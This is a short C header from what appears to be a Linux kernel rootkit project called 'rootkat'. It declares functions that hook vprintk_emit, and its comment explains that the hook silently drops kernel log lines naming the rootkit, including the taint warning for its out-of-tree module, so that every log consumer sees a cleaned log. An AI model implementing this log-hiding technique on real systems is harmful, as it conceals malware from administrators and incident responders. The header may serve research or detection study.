/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_PRINTK_H
#define ROOTKAT_HOOK_PRINTK_H

/*
 * vprintk_emit hook — drops messages whose formatted text contains the
 * rootkat marker before they enter the kernel ring buffer. Filters at
 * write time so every consumer (klogctl, /dev/kmsg, kdb, netconsole)
 * sees the same stripped log.
 *
 * Closes the most obvious self-detection surface: rootkat's own
 * pr_info("rootkat: ...") lines, and the kernel's "loading out-of-tree
 * module taints kernel" warning that names us by module name.
 */

int rootkat_hook_printk_install(void);
void rootkat_hook_printk_remove(void);

#endif
